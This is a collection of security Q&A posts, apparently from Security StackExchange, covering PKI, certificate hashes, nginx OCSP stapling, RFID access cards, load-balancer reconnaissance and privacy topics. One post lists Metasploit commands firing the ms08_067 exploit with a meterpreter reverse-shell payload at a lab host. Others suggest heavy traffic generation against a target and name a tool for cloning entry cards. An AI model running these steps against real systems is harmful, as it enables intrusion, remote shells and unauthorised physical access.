<p><img src=""https://i.stack.imgur.com/4cgAA.png"" alt=""disable-password-save-filezilla""></p>

<p>Then start using <a href=""http://keepass.info/"" rel=""nofollow noreferrer"">KeePass</a> to store your account credentials. There are also many <a href=""http://sww.co.nz/an-alternative-to-storing-passwords-in-filezilla-or-other-ftp-clients/"" rel=""nofollow noreferrer"">guides on the Internet about how to integrate KeePass with FileZilla</a>. Doing this, you're storing the encryption key somewhere where malware don't have access; you're storing the encryption key (or rather, the password from which the encryption key is derived) in your brain.</p>

<p>Finally (and perhaps this is a bit outside the scope of your question), please make sure you move away from FTP in favor of <a href=""https://en.wikipedia.org/wiki/SSH_File_Transfer_Protocol"" rel=""nofollow noreferrer"">SFTP</a>.</p>
","39325"
"How do you detect load balancing?","20661","","<h2>Scenario</h2>

<p>You need to PenTest XYZ.com.</p>

<p>You expect, because it is a high traffic site, that multiple servers are being used with a load balancer.</p>

<h2>Question</h2>

<p>Aside from pulling the MACs (which are obviously different) of the ""balanced"" servers, how can you detect balancing?</p>
","<p>Properly implemented, load balancing can be totally transparent; you may need to rely on other means (such as hunting though job ads for the company) to try guess at likely products.</p>

<p>However there are a few things you can check that at least imply the existance of a balancer:</p>

<ul>
<li>The HTTP headers may reveal the presense of a proxy server or other balancer.
<ul>
<li>Check here for different timestamps as well, implying slightly different clocks.</li>
<li>Check the order of the headers as well.</li>
</ul></li>
<li>Observe the system under load
<ul>
<li>Generate a ton of traffic; see if your requests start going somewhere else, or if the headers change, etc.</li>
</ul></li>
<li>General reconnaisance
<ul>
<li>The DNS response may reveal multiple IP addresses, implying balancing.</li>
<li>They may give it away in the hostname (cdn.xyz.com)</li>
<li>You may be able to get some more info from netcraft.com that leads you in the right direction</li>
</ul></li>
</ul>

<p>The <a href=""http://halberd.superadditive.com/doc/manual.pdf"">manual  for halberd</a> contains a good list of concepts that it uses (Date comparison; MIME header ﬁeld names, values and their order; Generating high amounts of traﬃc; Using diﬀerent URLs; Detecting server-side caches; Obtaining public IP addresses).</p>

<p>Using halberd or ldb is likely your best option in a practical situation - a lot of these tests are time consuming and finicky, so you likely want to automate all the busy work.</p>
","30664"
"Should the thumbprint be SHA2 in addition to the Signature Hash Algorithm?","20637","","<p>I'm looking at a Windows PKI and see that the Thumbprint is SHA1, while the Signature is SHA2 (SHA256).</p>

<p>Is this an acceptable configuration?</p>

<p>Should I recommend that the client update to SHA2 for a Thumbprint?</p>

<p>Would this cause some backward compatibility issues? </p>
","<h1>Computed field</h1>

<p>I think that's a <strong>calculated</strong> value by the Windows GUI. And not actually inside the cert. Have a look at the cert itself using OpenSSL. (<code>openssl x509 -in MYFILENAME.CER -noout -text</code>)</p>

<p>Here's a blog that talks about this:</p>

<ul>
<li><p><a href=""http://morgansimonsen.wordpress.com/2013/04/16/understanding-x-509-digital-certificate-thumbprints/"" rel=""nofollow noreferrer"">http://morgansimonsen.wordpress.com/2013/04/16/understanding-x-509-digital-certificate-thumbprints/</a></p>

<blockquote>
  <p>the thumbprint is a computed field, i.e. not a part of the certificate data itself.</p>
</blockquote></li>
</ul>
","74400"
"Can Skype chat be protected from snooping? Are there safe alternatives?","20598","","<p>I use Skype a <strong>lot</strong>. With all of my clients, staff, contractors and friends, however, the <a href=""http://bgr.com/2012/07/24/skype-privacy-policy-microsoft-spying/"">acquisition by Microsoft worries me</a>, as two of my clients are direct MS competitors, and I often work on long projects which are in development for over a year before they are launched to the public and are therefore pretty sensitive. </p>

<p>It's most likely paranoia, but I started wondering if there was a way to easily encrypt the chat so that the server wouldn't see anything useful.</p>

<p>Does this kind of thing exist?</p>

<p>If not are there any alternatives people can think of?</p>
","<p>There have been several suggestions that skype is indeed backdoored and evesdroppable. If your concerned about it because Microsoft is now the owner, there are plenty of other <a href=""http://www.makeuseof.com/tag/fed-up-with-skype-here-are-6-of-the-best-free-alternatives/"">alternatives to Skype</a> which I would suggest as the easiest and cleanest solution (besides, if MS is your competitor, why would you buy their services). Some of the alternatives like <a href=""https://jitsi.org/"">Jitsi</a> document their security quite well and are open source which lets you check if they're doing anything sus.</p>

<p>To answer your question about the chat. I came across <a href=""http://null-byte.wonderhowto.com/how-to/encrypt-your-skype-messages-thwart-snooping-eyes-using-pidgin-0131804/"">this guide</a> which is a plugin for pidgin that allows for encrypted chat messaging and Skype functionality, but I don't think it improves the security of the calls made. The other party will obviously need the plugins installed as well but if your serious about improving the security then it should be worth while.</p>

<p>As a side note, @TildalWave pointed out in the chat <a href=""http://www.skype.com/en/security/#review"">Microsoft brags about an independent Skype security review</a> however the paper they brag about is dated 2005 from before Microsoft bought Skype and before they implemented changes to encryption protocol from peer-to-peer key distribution to centralized public key distribution.</p>
","34511"
"How does SSL/TLS PKI work?","20539","","<p>We have lots of questions that address portions of SSL/TLS as it relates to PKI, but none of them seem to bring everything together.  A canonical answer that we can point people to I think would be quite helpful.  </p>

<ul>
<li>We have <a href=""https://security.stackexchange.com/questions/20803/how-does-ssl-tls-work"">How Does SSL/TLS Work?</a> which will give a nice basis, and does contain a section on client certificates.  It should be read before trying to understand PKI. </li>
<li>We have <a href=""https://security.stackexchange.com/questions/26489/a-different-approach-to-pki"">A Different Approach to PKI</a> which explains some problems with the overall ideas of PKI.</li>
<li>There is <a href=""https://security.stackexchange.com/questions/61962/how-does-ssl-client-authentication-work"">How does SSL client authentication work?</a>, which is a fairly terrible question and answer.  <a href=""https://security.stackexchange.com/questions/81814/easy-explanation-of-ssl-client-certificates-for-a-developer"">Easy explanation of SSL client certificates for a developer</a> is a bit better, but leaves something to be desired.</li>
<li>There are quite a few question and answers on actually <a href=""https://security.stackexchange.com/a/79078/52676"">implementing a PKI</a>, but that's a bit out of the scope of this question.</li>
</ul>

<p>I think the main questions to be answered that seem to be the source of some confusion among posters (All with respect to SSL/TLS):</p>

<ol>
<li>What is the difference between Public Key Infrastructure and Public Key Cryptography?  How are they related?</li>
<li>What is the main use case for PKI?</li>
<li>How are client certificates used in PKI?</li>
<li>What is a Certificate Authority's role in PKI?</li>
</ol>
","<p><strong>Public Key Cryptography</strong> designates the class of cryptographic algorithms that includes asymmetric encryption (and its cousin key exchange) and digital signatures. In these algorithms, there are two operations that correspond to each other (encrypt -> decrypt, or sign -> verify) with the characteristic that one of the operations can be done by everybody while the other is mathematically restricted to the owner of a specific secret. The public operation (encrypting a message, verifying a signature) uses a public parameter called a <em>public key</em>; the corresponding private operation (decrypting that which was encrypted, signing that which can be verified) uses a corresponding private parameter called a <em>private key</em>. The public and private key come from a common underlying mathematical object, and are called together a <em>public/private key pair</em>. The magic of asymmetric cryptography is that while the public and private parts of a key pair correspond to each other, the public part can be made, indeed, public, and this does not reveal the private part. A private key can be computed from a public key only through a computation that is way too expensive to be envisioned with existing technology.</p>

<p>To make the story short, if you know the public key of some entity (a server, a human user...) then you can establish a secured data tunnel with that entity (e.g. with SSL/TLS in a connected context, or encrypting emails with S/MIME).</p>

<p>The problem, now, is one of <em>key distribution</em>. When you want to connect to a server called <code>www.example.com</code>, how do you make sure that the public key you are about to use really belongs to that server ? By ""belong"", we mean that the corresponding private key is under control of that server (and nobody else).</p>

<p><strong>Public Key Infrastructures</strong> are a solution for that problem. Basically:</p>

<ul>
<li>The <em>goal</em> of a PKI is to provide to users some verifiable guarantee as to the ownership of public keys.</li>
<li>The <em>means</em> of a PKI are digital signatures.</li>
</ul>

<p>In that sense, a PKI is a support system for usage of public key cryptography, and it itself uses public key cryptography.</p>

<p>The core concept of a PKI is that of a <strong>certificate</strong>. A certificate contains an <em>identity</em> (say, a server name) and a <em>public key</em>, which is purported to belong to the designated entity (that named server). The whole is <em>signed</em> by a <strong>Certification Authority</strong>. The CA is supposed to ""make sure"" in some way that the public key is really owned by the named entity, and then issues (i.e. signs) the certificate; the CA also has its own public/private key pair. That way, users (say, Web browsers) that see the certificate and know the CA public key can verify the signature on the certificate, thus gain confidence in the certificate contents, and that way learn the mapping between the designated entity (the server whose name is in the certificate) and its public key.</p>

<p>Take five minutes to grasp the fine details of that mechanism. A signature, by itself, does not make something trustworthy. When a message <em>M</em> is signed and the signature is successfully verified with public key <em>K</em><sub>p</sub>, then cryptography tells you that the message <em>M</em> is exactly as it was, down to the last bit, when the owner of the corresponding private key <em>K</em><sub>s</sub> computed that signature. This does not automatically tell you that the contents of <em>M</em> are true. What the certificate does is that it <strong>moves the key distribution problem</strong>: initially your problem was that of knowing the server's public key; now it is one of knowing the CA's public key, with the additional issue that you also have to <em>trust</em> that CA.</p>

<p>How can PKI help, then ? The important point is about <em>numbers</em>. A given CA may issue certificates for millions of servers. Thus, by action of the CA, the key distribution problem has been modified in two ways:</p>

<ul>
<li><p>From ""knowing the public keys of hundreds of millions of server certificates"", it has been reduced to ""knowing the public keys of a thousand or so of CA"".</p></li>
<li><p>Conversely, an additional trust requirement has arisen: you not only need to know the CA keys, but also you need to trust them: the CA must be honest (it won't knowingly sign a certificate with a wrong name/key association) and also competent (it won't <em>unknowingly</em> sign a certificate with a fake name/key association).</p></li>
</ul>

<p>The PKI becomes a true <strong>infrastructure</strong> when recursion is applied: the public keys of CA are themselves stored in certificates signed by some über-CA. This further reduces the number of keys that need to be known <em>a priori</em> by users; and this also increases the trust issue. Indeed, if CA2 signs a certificate for CA1, and CA1 signs a certificate for server S, then the end user who wants to validate that server S must trust CA2 for being honest, and competent, and also for <em>somehow</em> taking care not to issue a certificate to incompetent or dishonest CA. Here:</p>

<ul>
<li>CA1 says: ""the public key of server <em>S</em> is <em>xxx</em>"". CA1 does <em>not</em> say ""server <em>S</em> is honest and trustworthy"".</li>
<li>CA2 says: ""the public key of CA1 is <em>yyy</em> AND that CA is trustworthy"".</li>
</ul>

<p>If you iterate the process you end up with a handful of <strong>root CA</strong> (called ""trust anchors"" in <a href=""http://tools.ietf.org/html/rfc5280"">X.509</a> terminology) that are known <em>a priori</em> by end users (they are included in your OS / browser), and that are considered trustworthy at all meta-levels. I.e. we trust a root CA for properly identifying intermediate CA <em>and</em> for being able to verify their trustworthiness, including their ability to themselves delegate such trustworthiness.</p>

<p>Whether the hundred or so of root CA that Microsoft found fit to include by default in Windows are that much trustworthy is an open question. The whole PKI structure holds due to the following characteristics:</p>

<ul>
<li><p>PKI depth is limited. A certificate chain from a root CA down to an SSL server certificate will include 3 or 4 certificates at most.</p></li>
<li><p>CA are very jealous of their power and won't issue certificates to just any wannabe intermediate CA. Whether that ""CA power"" is delegated is specified in the certificate. When a CA issues a certificate to a sub-CA, with that specific mark, it does so only within a heavy context (contracts, insurances, audits, and lots of dollars). Ultimately, trust is ensured through fear. Offending CA are severely punished.</p></li>
<li><p>Nobody really has interest in breaking the system, since there is no readily available substitute.</p></li>
</ul>

<p>Note that, down the chain, the server <em>S</em> is verified to really own a specific public key, but nobody says that the server is honest. When you connect to <code>https://www.wewillgraballyourmoney.com/</code> and see the iconic green padlock, the whole PKI guarantees you that you are really talking to that specific server; it does not tell you that sending them your credit card number would be a good idea.</p>

<p>Moreover, all of this is association between the server name <em>as it appears in the target URL</em> and a public key. This does not extend to the name <em>intended by the user</em>, as that name lives only in the user's brain. If the user wants to connect to <code>www.paypal.com</code> but really follows a URL to <code>www.paaypaal.com</code>, then the PKI and the browser will in no way be able to notice that the user really wanted to talk to PayPal, and not another server with a roughly similar (but not identical) name.</p>

<hr />

<p>The <strong>main use case</strong> for a PKI is distributing public keys for lots of entities. In the case of Web browsers and SSL, the browser user must be able to check that the server he tries to talk to is indeed the one he believes it to be; this must work for hundreds of millions of servers, some of which having come to existence <em>after</em> the browser was written and deployed. Reducing that problem to knowing a hundred root CA keys makes it manageable, since one <em>can</em> indeed include a hundred public keys in a Web browser (that's a million times easier than including a hundred million public keys in a Web browser).</p>

<p><strong>Client certificates</strong> are a SSL-specific feature. In all of the above we talked about a <em>SSL client</em> (Web browser) trying to authenticate a <em>SSL server</em> (Web server with HTTPS). SSL additionally supports the other direction: a SSL server who wants to make sure that it talks to a specific, named client. The same mechanism can be used, with certificates.</p>

<p>An important point to notice is that the server certificate and the client certificate live in different worlds. The server certificate is validated by the client. The client certificate is validated by the server. Both validations are independent of each other; they are performed by distinct entities, and may use distinct root CA.</p>

<p>The main reason why SSL servers have certificates is because clients cannot possibly know beforehand the public keys of all servers: there are too many of them, and new ones are created with every passing minute. On the other hand, when a server wants to authenticate a client, this is because that client is a <em>registered user</em>. Usually, servers know all their users, which is why most can use a simpler password-based authentication mechanism. SSL client certificates are thus rather rare in practice, because the main advantage of certificates (authenticating entities without prior knowledge) is not a feature that most servers want.</p>
","89072"
"What is the difference between Exploit and Payload?","20532","","<p>In computer security, we know that weak points in software are called <strong>vulnerabilities</strong> (if related to security). And once the vulnerability is found, theoretically it requires a piece of code as proof of concept (this is called an <strong>exploit</strong>). In this context, the term <strong>payload</strong> is also mentioned.</p>

<p>Then, what is the difference between 'payload' and 'exploit'?</p>
","<p>The exploit is what delivers the payload. 
Take a missile as an analogy. You have the rocket and fuel and everything else in the rocket, and then you have the warhead that does the actual damage. Without the warhead, the missile doesn't do very much when it hits. Additionally, a warhead isn't much use if it goes off in your bunker without a rocket delivering it.</p>

<p>The delivery system(missile) is the exploit and the payload (warhead) is the code that actually does something.</p>

<p>Exploits give you the ability to 'pop a shell/run your payload code'.</p>

<p>Example payloads are things like Trojans/RATs, keyloggers, reverse shells etc.</p>

<p>Payloads are only referred to when code execution is possible and not when using things like denial of service exploits.</p>

<p><img src=""https://i.stack.imgur.com/FeauO.png"" alt=""Flow chart""> <img src=""https://i.stack.imgur.com/2mykq.png"" alt=""Bunker Buster exploitz""></p>
","34420"
"How to use OAuth with Active Directory","20532","","<p>I'm creating a REST WCF service and want to use OAuth to authenticate each user's request. The user accounts are stored in Active Directory so I have access to their AD login name on the client application and can pass that information along with the request header.</p>

<p>I've used oauth with the FatSecret REST API before so I'm familiar with <em>how</em> the authentication works.</p>

<p><strong>Basically I'm just not sure how to handle assigning and storing secret keys for the users and how to go about tying a user's secret key to their AD login name.</strong></p>

<p>Would I just have another database that held a mapping table of user AD login names to secret keys and then just do a lookup for the secret key on that table when the request comes in?</p>

<p>How do I ensure that the incoming request is actually coming from the user whose login name is in the incoming request, <em>couldn't anyone just open Fiddler and create a request with another user's AD login name</em>?</p>
","<p>I'm not sure what OAuth gives you that can't be accomplished using other means.  WCF + Rest works very well with claims based authentication bundled in WIF.</p>

<p>Since WCF implies you're using ASP.NET I recommend using <a href=""http://www.microsoft.com/download/en/details.aspx?id=17331"" rel=""nofollow noreferrer"">Windows Identity Foundation (WIF)</a> on the server side.  Check out <a href=""http://blogs.msdn.com/b/vbertocci/archive/2010/08/30/just-out-the-ebook-version-of-programming-windows-identity-foundation.aspx"" rel=""nofollow noreferrer"">this ebook for more info.</a></p>

<p>Next you need a way to expose AD to your app.  You can <a href=""http://msdn.microsoft.com/en-us/security/aa570351"" rel=""nofollow noreferrer"">use ADFSv2</a> which is free on Windows 2008 R2.  Take a look at the SQL installation that protects from session replay attacks.</p>

<p>Copying and pasting the credentials from Fiddler isn't something you can completely stop. HTTPS helps, but if you really want to investigate this issue look at <a href=""https://stackoverflow.com/q/9636857/328397"">this Q&amp;A on Stackoverflow</a>.  </p>
","13096"
"Reversing an entry card - How to find out what type of RFID hardware I need to read the chip?","20492","","<p>I have an acccess/entry card chip I want to copy for demonstrational purposes. However I am not sure how I can find out what type of RFID reader I need to get a hold of. </p>

<p>Does anyone have a suggestion how I can figure out what type of chip it is and thus what type of reader I need to be able to copy it? </p>

<p>Possible use cases: </p>

<ul>
<li>Social engineering the business who owns the card or the card issuer (ex. G4S) and try find out the manufacturer is. </li>
<li>Oscilloscope - Read the frequency and get a reader with the same scope. </li>
<li>Dissolving the card (ex. with nail polish remover) and try find out who the manufacturer is by looking for clues on the chip or on the plastic.</li>
</ul>
","<p>You only need one RFID device, its the <a href=""https://github.com/Proxmark/proxmark3"" rel=""nofollow"">Proxmark3</a>.  There are many protocols and frequencies used by RFID and the Proxmark3 tries to support all of them.  It is open source hardware and software and breaks every commercial RFID card I know of.  The real problem with RFID is that you have a very limited power usage so you are forced to use weak crypto systems.   Often times they rely upon security though obscurity, and the Proxmark3 is designed to overcome this. </p>
","5216"
"SSL/TLS: How to fix ""Chain issues: Contains anchor""","20445","","<p>I just ran a quick test at ssllabs.com: got A+, which I'm happy about.</p>

<p>However there's one thing I don't know how to ""fix"":
My site supports OCSP stapling and ssllabs keeps telling me: Chain issues: Contains anchor.
I know this is just a ""warning"" in the sense that it slows down the connection a bit.</p>

<p>nginx config:  </p>

<pre><code>..
ssl_certificate             public.crt;
ssl_certificate_key         private.key;
ssl_stapling                on;
ssl_stapling_verify         on;
ssl_trusted_certificate     my-chain.pem;
..
</code></pre>

<p>Where:<br>
- <strong>public.crt</strong> is the public certificate I got from StartSSL<br>
- <strong>private.key</strong> the certificate's private key<br>
- <strong>my-chain.pem</strong> (ssllabs calls this: ""Additional Certificates (if supplied)"") consist of:  </p>

<pre><code>1.) StartCom Class 1 Primary Intermediate Server CA  
2.) StartCom Certification Authority
</code></pre>

<p>I found a site which also uses StartCom (StartSSL) certificates, supports OCSP stapling, but does not have the issue described above.  </p>

<p>This site's ""Additional Certificates"":  </p>

<pre><code>1.) StartCom Class 1 Primary Intermediate Server CA
</code></pre>

<p>I've tried the same: Only put ""StartCom Class 1 Primary Intermediate Server CA"" to my-chain.pem.<br>
However then ssllabs says: <strong>OCSP stapling: No</strong> So this seems to completely break OCSP stapling.</p>

<p>Any idea?</p>

<h1>EDIT:</h1>

<h2>Finally fixed!</h2>

<pre><code>ssl_certificate = Site certificate + StartCom Class 1 Primary Intermediate Server CA  
ssl_trusted_certificate = StartCom Class 1 Primary Intermediate Server CA + StartCom Certification Authority
</code></pre>
","<p>According to <a href=""http://nginx.org/en/docs/http/ngx_http_ssl_module.html#ssl_trusted_certificate"">nginx documentation</a> the <code>ssl_trusted_certificate</code> parameter contains trusted CA certificates <em>used to verify client certificates and OCSP responses if ssl_stapling is enabled</em> and <em>the list of these certificates will not be sent to clients</em>.</p>

<p>Therefore I think that what ssllabs calls ""Additional Certificates (if supplied)"" are the certificates in the <code>ssl_certificate</code> file which are not the server certificate.</p>

<p>For me:</p>

<p><code>public.crt</code> should contain these 2 certificates:</p>

<pre><code>1) your server certificate
2) StartCom Class 1 Primary Intermediate Server CA 
</code></pre>

<p><code>my-chain.pem</code> should contain these 2 certificates:</p>

<pre><code>1) StartCom Class 1 Primary Intermediate Server CA // required to validate the server certificate OCSP response 
2) StartCom Certification Authority  // required to validate the intermediate CA certificate OCSP response 
</code></pre>
","79538"
"Is it possible to steal money directly from the systems of a big bank?","20407","","<p>Sometimes I imagine: My money in the bank is just a floating point number in a mainframe's memory... So, if I just change 1 bit, I will win a lot of money...</p>

<p>The most common way to steal money in banks today is to just ask people for their account information and credentials, through fake e-mails or websites.  However, this would seem to leave a fairly high chance of being identified if the victim catches on.</p>

<p>Alternatively, are there more anonymous ways by which one might steal money directly from the bank's servers?  Or, is this virtually impossible to the point that the only real weakness lies in the customers?</p>

<p>Is a hack like this only possible in Hollywood movies, or can it really be done in reality?  Are there any known cases of this already having happened.</p>
","<p>Each transaction needs an audit trail - numbers need to come from somewhere - and bank systems have these checks in place. Are they perfect? Almost, but enough to make it easier to look for other attack vectors, like humans.</p>

<p>Did I mention that I was in jail in a far away country and I need you to wire me money for bail?</p>
","13195"
"Why are MD5 and SHA-1 still used for checksums and certificates if they are called broken?","20386","","<p>I was just reading about SSL/TLS stuff, and <a href=""https://fancynossl.hboeck.de"" rel=""nofollow noreferrer"">according to this site</a> (which is rated as A by Qualys SSL Labs), MD5 is totally broken, and SHA-1 is cryptographically weak since 2005. And yet, I noticed that a lot of programmers and even Microsoft only give us SHA-1/MD5 to check the integrity of files...</p>

<p>As far I know, if I change one bit of a file, their MD5/SHA-1 will change so why/how they are broken? In which situations can I still trust checksums made with SHA-1/MD5? What about SSL certificates that still use SHA-1 like google.com?</p>

<p>I am interested in applications of MD5 and SHA-1 for checksums and for certificate validation. I am not asking about password hashing, which <a href=""https://security.stackexchange.com/questions/15790/why-do-people-still-use-recommend-md5-if-it-is-cracked-since-1996"">has been treated in this question</a>.</p>
","<p>SHA-1 and MD5 are broken in the sense that they are vulnerable to collision attacks. That is, it has become (or, for SHA-1, will soon become) realistic to find two strings that have the same hash.</p>

<p>As explained <a href=""https://security.stackexchange.com/a/31871/74726"">here</a>, collision attacks do not directly affect passwords or file integrity because those fall under the preimage and second preimage case, respectively.</p>

<p>However, MD5 and SHA-1 are still less computationally expensive. Passwords hashed with these algorithms are easier to crack than the stronger algorithms that currently exist. Although not specifically broken, using stronger algorithms is advisable.</p>

<p>In the case of certificates, signatures state that a hash of a particular certificate is valid for a particular website. But, if you can craft a second certificate with that hash, you can impersonate other websites. In the case of MD5, this has already happened, and browsers will be phasing out SHA-1 soon as a preventative measure (<a href=""https://blog.mozilla.org/security/2014/09/23/phasing-out-certificates-with-sha-1-based-signature-algorithms/"" rel=""nofollow noreferrer"">source</a>).</p>

<p>File integrity checking is often intended to ensure that a file was downloaded correctly. But, if it is being used to verify that the file was not maliciously tampered with, you should consider an algorithm that is more resilient to collisions (see also: <a href=""https://www.win.tue.nl/hashclash/SoftIntCodeSign/"" rel=""nofollow noreferrer"">chosen-prefix attacks</a>).</p>
","87377"
"Exploiting through a filtered port","20381","","<p>I'm doing some pentesting against a machine the lecturer set up in the lab. NMAP shows port 445 to be filtered and Nessus confirms the ms08_067 vulnerability is present on that machine.</p>

<p>I tried running Metasploit against it the normal way:</p>

<pre><code>use exlpoit/windows/smb/ms08_067_netapi
set RHOST TARGET_IP
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST MY_IP
exploit
</code></pre>

<p>It tells me:</p>

<blockquote>
  <p>[-] Exploit failed [unreachable]: Rex::ConnectionRefused The
  connection was refused by the remote host (192.168.2.2:445)</p>
</blockquote>

<p>I'm guessing the exploit is failing because port 445 is filtered. The thing that has me puzzled is that Nessus can apparently check that the vulnerability is present. Since Nessus can do that through the filtered port, <strong>is there a way I can launch the exploit through a filtered port? Are there any Metasploit settings that need to be arranged?</strong></p>
","<p>You have contradictory information: nmap says the port is filtered but nessus says that the vulnerability is present on the system. They cannot both be true, one of these must be wrong. Given that metasploit is unable to connect it is likely that nessus is reporting incorrectly, or is basing the vulnerability report on information gleaned from other open ports. If you look at <a href=""http://www.tenable.com/blog/how-did-you-test-for-ms08-067"">tenable's page on that advisory</a> you will see that nessus can test for it using port 139 or port 445, so 139 is probably open, and may be exploitable. </p>
","53109"
"Firebug reports SHA-1 certificate error","20356","","<p>For the script at the bottom of this post, Firebug reports the following error:</p>

<blockquote>
  <p>This site makes use of a SHA-1 Certificate; it's recommended you use
  certificates with signature algorithms that use hash functions
  stronger than SHA-1</p>
</blockquote>

<p>The error is duplicated for every call to googleapis, and does appear for links to resources on my server (i.e. clicks.js).</p>

<p><a href=""https://www.ssllabs.com"" rel=""nofollow noreferrer"">https://www.ssllabs.com</a> indicates that I am using SHA256withRSA.</p>

<p><code>oppenssl</code> also indicates that I am using sha256WithRSAEncryption.</p>

<pre><code>[root@devserver ~]# openssl req -in /etc/pki/tls/private/mysite_csr.pem -noout -text
Certificate Request:
    Data:
        Version: 0 (0x0)
        Subject: C=US, ST=Washington, L=Bothell, O=MySite, CN=mysite.com/emailAddress=xxx@comcastdotnet
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (3072 bit)
                Modulus:
                    xxxx
                Exponent: 65537 (0x10001)
        Attributes:
            a0:00
    Signature Algorithm: sha256WithRSAEncryption
         xxxx
[root@devserver ~]#
</code></pre>

<p>It occurs both with self-signed certificates as well as those from a CA.</p>

<p>The script which causes the error is below along with the Firebug errors.</p>

<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
    &lt;head&gt;
        &lt;meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8""&gt;
        &lt;title&gt;Testing&lt;/title&gt;  
        &lt;link href=""https://ajax.googleapis.com/ajax/libs/jqueryui/1.11.2/themes/ui-lightness/jquery-ui.css"" type=""text/css"" rel=""stylesheet"" /&gt;
        &lt;script src=""https://ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.js"" type=""text/javascript""&gt;&lt;/script&gt;
        &lt;script src=""https://ajax.googleapis.com/ajax/libs/jqueryui/1.11.2/jquery-ui.js"" type=""text/javascript""&gt;&lt;/script&gt;
        &lt;script src=""clicks.js"" type=""text/javascript""&gt;&lt;/script&gt;
    &lt;/head&gt;

    &lt;body&gt;
    &lt;/body&gt; 
&lt;/html&gt; 
</code></pre>

<p><img src=""https://i.stack.imgur.com/vGq3R.png"" alt=""enter image description here""></p>

<p>Left clicking to copy the errors provides the following:</p>

<pre><code>This site makes use of a SHA-1 Certificate; it's recommended you use certificates with signature algorithms that use hash functions stronger than SHA-1.
https://ajax.googleapis.com/ajax/libs/jqueryui/1.11.2/themes/ui-lightness/jquery-ui.css
Line 0

This site makes use of a SHA-1 Certificate; it's recommended you use certificates with signature algorithms that use hash functions stronger than SHA-1.
https://ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.js
Line 0

This site makes use of a SHA-1 Certificate; it's recommended you use certificates with signature algorithms that use hash functions stronger than SHA-1.
https://ajax.googleapis.com/ajax/libs/jqueryui/1.11.2/jquery-ui.js
Line 0
</code></pre>

<p>What causes this error, and how is it eliminated?</p>
","<p>The problem isn't <em>your</em> certificate, it's the certificate of <code>googleapis.com</code>, which you're accessing by way of loading their jQuery libraries.</p>

<p>If you go <a href=""https://ajax.googleapis.com/ajax/libs/jqueryui/1.11.2/themes/ui-lightness/jquery-ui.css"">directly to one of the scripts</a>, you can click on the padlock icon and see more information about the SSL certificate:</p>

<pre><code>+- GeoTrust Global CA
+--- Google Internet Authority G2
+----- *.storage.googleapis.com
     +--- Certificate Signature Algorithm: PCKS #1 SHA-1 With RSA Encryption
</code></pre>

<p>I wouldn't worry too much about it - Google are hoping to move forward to SHA256 soon, and it's hardly likely to affect you.</p>

<p>If you're really worried about it, move the copies of jQuery over to your site locally, then include them from there. That way you're not fetching resources from 3rd party hosts.</p>
","89529"
"Do I really need all these Certificate Authorities in my browser or in my keychain?","20347","","<p>There are lots of strange looking Certificate Authorities in my keychain as well as Firefox. I am sure they are legitimate CAs (as they are the same on my Mac and PC and other computers I checked). And by strange I mean they seems to be specific to same other countries or organizations that I am sure I have nothing to do with, is there a way to safely remove these unnecessary CAs? Is there a list for regular US users or a way to disable them and enable them when they ar needed?</p>
","<p>The Web is worldwide. That you are a ""US user"" does not mean that you will only look at US websites.</p>

<p>You can remove any CA certificate that you do not wish to trust. That's your prerogative. The only consequence of removing a CA certificate is that the machine will cease to automatically accept as valid any certificate issued by the said CA. Translation: some HTTPS Web site may begin to trigger scary warnings, which you can always bypass, but which are scary nonetheless (and training yourself to bypass scary warnings might not be a good idea anyway).</p>

<p>The truth is that, as a user, you have very little information on which you could base your decision of trusting or not trusting any particular CA. Ideally, you would trust only those CA for which you can establish a clear responsibility path down to you: the CA which will give you a lot of money in case you get swindled due to a mistake made by the CA. However, there is no such CA. Instead, what you have is a list of ""default CA"" who made a deal with the OS vendor (Apple, in the case of Mac OS) so that the OS vendor accepts to include them as ""default CA"". These CA, and Apple, are way too smart, legally speaking, to give you money in case of any problem (as a Mac user, your money relationship with Apple rather flows in the other direction). Yet, if one of the ""default CA"" begins to behave improperly, that's Apple public image which is at stake.</p>

<p>So my advice would be to let things as they are. This is what almost everybody does. Remember that, in any case, the point of the CA is to validate the certificate, which does <em>not</em> mean that the corresponding site is maintained by honest and trustworthy people; the only thing that the CA guarantees is that the Web page you are looking at really came from the Web site whose name is in the URL bar.</p>
","7087"
"Potential employer wants me to email my SSN with an application form, is this a major security risk?","20299","","<p>I'm job hunting at the moment and I've come across several potential employers that have PDF's that you would download, fill in, and then email to them. I feel EXTREMELY uncomfortable sending my personal information such as name, address, phone number, work history...etc through such insecure methods, never mind my SSN or similar sensitive information.</p>

<p>I feel like this is a major personal security risk for myself. Is it? If so, how can I make that clear to them while still maintaining my eligibility for employment?</p>
","<blockquote>
  <p>I feel like this is a major personal security risk for myself. Is it?</p>
</blockquote>

<p>It may be. You may not be targeted specifically, but ""email is a private as a postcard"". (Not enough reputation for a link, but it's googleable.)</p>

<blockquote>
  <p>If so, how can I make that clear to them while still maintaining my eligibility for employment?</p>
</blockquote>

<p>I would've called my contact person and explained that I'm a security conscious person and that I don't feel comfortable with sending all that information over the Internet. I would then ask if there is another way for them to recieve it, or if they could wait until an in-person interview. </p>

<p>It may also be illegal for them to require you to send it over unecrypted email, depending on which state you are in. I'm neither a US citizen or a lawyer, but this came to mind:</p>

<p>See <a href=""http://consumersunion.org/news/state-laws-restricting-private-use-of-social-security-numbers/"">http://consumersunion.org/news/state-laws-restricting-private-use-of-social-security-numbers/</a> and for example <a href=""http://www.leginfo.ca.gov/cgi-bin/displaycode?section=civ&amp;group=01001-02000&amp;file=1798.85-1798.89"">California civil code</a></p>

<blockquote>
  <p>1798.85.  (a) Except as provided in this section, a person or entity
  may not do any of the following:
  [...]
     (3) Require an individual to transmit his or her social security
  number over the Internet, unless the connection is secure or the
  social security number is encrypted.</p>
</blockquote>
","92588"
"Decrypt cipher texts encypted with the same one time pad key","20138","","<p>I have two pieces of ciphertext encrypted with a stream cipher using the same key. </p>

<p>How do I recover the plaintext of both ciphertext messages without knowing the key used?</p>
","<p>If the two encrypted messages are using the same stream cipher and the same key,</p>

<p><code>C1 xor C2</code> results in <code>M1 xor M2</code> where C1 and C2 are the respective ciphertext and M1 and M2 are the corresponding plaintext.</p>

